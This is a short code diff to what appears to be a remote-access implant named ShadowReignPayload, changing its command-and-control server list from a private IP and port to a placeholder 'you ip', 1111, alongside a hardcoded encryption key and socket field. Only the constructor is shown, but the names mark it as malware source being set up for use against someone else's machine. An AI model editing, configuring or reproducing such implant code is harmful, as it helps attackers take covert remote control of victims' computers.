@@ -30,7 +30,7 @@ def rand_name(length=10):
 
 class ShadowReignPayload:
     def __init__(self):
-        self.c2_list = [("192.168.1.133", 5251)]  # Dynamic C2 list, update primary IP
+        self.c2_list = [("you ip", 1111)]  # Dynamic C2 list, update primary IP
         self.current_c2_index = 0
         self.KEY = b"ShadowReignBoss!"
         self.sock = None
